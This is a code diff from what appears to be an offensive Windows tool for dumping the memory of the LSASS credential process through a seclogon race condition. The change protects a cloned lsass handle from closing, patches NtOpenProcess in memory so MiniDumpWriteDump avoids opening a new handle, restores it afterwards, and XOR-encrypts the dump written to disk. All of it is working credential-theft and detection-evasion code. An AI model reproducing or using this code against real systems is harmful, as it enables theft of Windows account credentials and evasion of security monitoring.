@@ -423,6 +423,8 @@ void MalSeclogonDumpLsassWithSeclogonRaceCondition(int lsassPid, wchar_t* dumpPa
 	PROCESS_INFORMATION procInfo;
 	STARTUPINFO startInfo;
 	DWORD originalPid, originalTid;
+	char oldCode[15];
+	int oldCodeSize;
 	HANDLE handles[8192];
 	DWORD handlesCount = 0;
 	DWORD seclogonPid = 0;
@@ -470,13 +472,18 @@ void MalSeclogonDumpLsassWithSeclogonRaceCondition(int lsassPid, wchar_t* dumpPa
 			// init global vars for storing dump in memory
 			gDumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, MAX_LSASS_DMP_SIZE);
 			gBytesRead = 0;
-			// passing 0 as pid to MiniDumpWriteDump will avoid an additional open process to lsass
-			// trick described here --> https://rastamouse.me/dumping-lsass-with-duplicated-handles/
-			BOOL result = MiniDumpWriteDumpDyn((HANDLE)hLsassClone, 0, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
+			// we ensure no one will close the handle, it seems RtlQueryProcessDebugInformation() called from MiniDumpWriteDump() try to close it
+			SetHandleInformation(hLsassClone, HANDLE_FLAG_PROTECT_FROM_CLOSE, HANDLE_FLAG_PROTECT_FROM_CLOSE);
+			// we need to patch NtOpenProcess because MiniDumpWriteDump() would open a new handle to lsass and we want to avoid that
+			ReplaceNtOpenProcess((HANDLE)hLsassClone, oldCode, &oldCodeSize);
+			BOOL result = MiniDumpWriteDumpDyn((HANDLE)hLsassClone, GetProcessId(hLsassClone), NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
 			if (!result) {
 				printf("MiniDumpWriteDump failed with error code %d\n", GetLastError());
 				exit(-1);
 			}
+			RestoreNtOpenProcess(oldCode, oldCodeSize);
+			// unprotect the handle for close
+			SetHandleInformation(hLsassClone, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0);
 			EncryptAndWriteDumpToDisk(dumpPath, xorKey);
 			HeapFree(GetProcessHeap(), 0, gDumpBuffer);
 			gDumpBuffer = NULL;
